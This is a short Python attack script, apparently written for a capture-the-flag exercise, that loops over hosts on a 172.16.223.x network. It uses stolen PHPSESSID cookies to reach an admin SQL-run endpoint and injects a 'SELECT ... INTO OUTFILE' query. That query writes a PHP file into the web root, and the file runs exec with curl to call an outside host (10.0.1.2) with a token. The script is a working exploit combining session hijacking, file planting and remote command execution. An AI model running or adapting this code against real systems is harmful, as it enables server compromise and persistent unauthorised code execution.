import requests
import time
file = open(r'I:\python visual studio code\ctf\cookie.txt', 'r')
pfile = file.readlines()
print(pfile)
for i in pfile:
    #url = 'http://172.16.223.'+str(i)+'/index.php?r=admin'
    url1 = 'http://172.16.223.'+str(i[:3])+'/index.php?r=admin/dbback/sqlrun'
    headers = {
        'User-Agent' : 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181',
        'Cookie' : 'PHPSESSID='+str(i[4:-1])
        }
    data = {
        'sqlcode' : "select '<?php  $a = exec(\"curl http://10.0.1.2?token=EPCAFZKV\",$out,$status);  print_r($a);  ?>' into outfile '/var/www/html/protected/include/core/db/con.php'"
        }

    yy = requests.post(url1, headers=headers, data=data).text
    print(str(i[:3])+':'+'执行成功')
    #print(yy)
    #print(str(i[:3])+':'+':执行成功')
file.close()


